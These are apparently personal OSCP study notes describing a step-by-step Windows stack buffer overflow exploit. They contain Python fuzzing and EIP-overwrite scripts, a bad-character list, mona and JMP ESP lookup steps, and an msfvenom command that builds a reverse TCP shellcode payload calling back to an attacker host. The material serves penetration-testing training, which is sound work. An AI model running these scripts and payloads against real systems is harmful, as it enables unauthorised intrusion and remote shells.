OSCP BOF :
=========

1)
scan the machine for open ports and services

2)
connect with netcat to the port to see how the service works and communicates

3)
spiking with "generic_send_tcp" :
- create a method.spk file:

	s_readline();
	s_string("METHOD ");
	s_string_variable("0");

- run command in kali linux: generic_send_tcp host port spike_script.spk 0 0


4)
create a python fuzzing script:

	#! /usr/bin/python
	import sys, socket
	from time import sleep
	
	buffer = "A" * 100
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('host',port))

			s.send(('METHOD /.:/' + buffer))
			s.close()
			sleep(1)
			buffer = buffer + "A"*100
		except:
			print "Fuzzing crashed at %s bytes" % str(len(buffer))
			sys.exit()

5)
finding the offset:

tool in kali linux: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

* ^ it will generete a code we gonna send to the server

python script:
	
	#!/usr/bin/python
	import sys, socket
	
	offset = "the code that we generated"
	
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('host', port))
		s.send(('METHOD /.:/' + offset))
		s.close()
	
	except:
		print "Error connecting server"
		sys.exit()

** the program will crash and we will get the value of the EIP -> in the immunity debugger 

after you have the EIP address :
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_address
** this will provide us the offset 

6)
control the EIP- overwrite it with specific bytes:


python script:

	#!/usr/bin/bash
	import sys, socket
 
	shellcode = "A" * offset + "B" * 4
            
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('host', port)) 
                s.send(('METHOD /.:/' + shellcode))
                s.close()

        except:
                print "Error connecting server"
                sys.exit() 
7)
finding bad characters:

*running hex chars in the programe
a- google badchars
b - copy the var badchars
c - paste in the python script

 python script:
	
	#!/usr/bin/bash
        import sys, socket 

	badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
	"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
	"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
	"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
	"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
	"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
	"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

        shellcode = "A" * offset + "B" * 4 + badchars     

        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('host', port))
                s.send(('METHOD /.:/' + shellcode))
                s.close()

        except:
                print "Error connecting server"
                sys.exit()
 
** now in the immunity debugger we exem the ESP -> left click and 'Follow in dump': look if there is a missing char in badchars we have sent (for example B0 insted the char)
	we exam the 'HEX Dump' from 00 to ff
	and ducomnet all the bad chars!!! very importent befor generating the shellcode ! ! !

8)
finding the right module:

	A)download a program , for example 'mona.py' in github and put it in : Program Files(x86)>Immunity Inc>Immunity Debugger>PyCommands

	B)in Immunity Debugger: type in the commandline - '!mona modules' and hit Enter
	  a window will pop : we will check the 'Moduke Info' table- look for dll that connected to the program with the BOF and with security settings of False in the table

	C)in kali linux:
		locate nasm_shell
		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb : try to convert assambley to hex
		nasm> JMP ESP 
		(the result will be something like this: FFE4
	D) copy the hex code for JMP ESP and in Immunity Debugger commandline type: !mona find -s "\xff\xe4" -m dll_file_name.dll
	E)now we looking for return addresses and write them down
	F)now we gonna write the return address in our input insted of the EIP pointer address:
	  * we need to write it backwords- for example- if the address is '625011af' , we will write "\xaf\x11\x50\x62"	
	G)in Immunity Debugger we push on the blue arrow and insert the original ^  return address
	  its will find us the JMP ESP and the address we entered
	H)hit F2 to set a breakpoint and run the program again with our input . check if the EIP is pointing to the return address of JMP ESP we entered   

9)
generate shellcode with msfvenom:

		msfvenom -p windows/dhell_reverse_tcp LHOST=host LPORT=port EXITFUNC=thread -f c -a x86 -b"\x00" (-b is for badchars)

now lets build the payload :
				"A" * offset + pointer_address(JMP ESP address) + "\x90" * 32 + shellcode
                                                                                        ^ the NOP can be also 16 - need to plat with the padding 
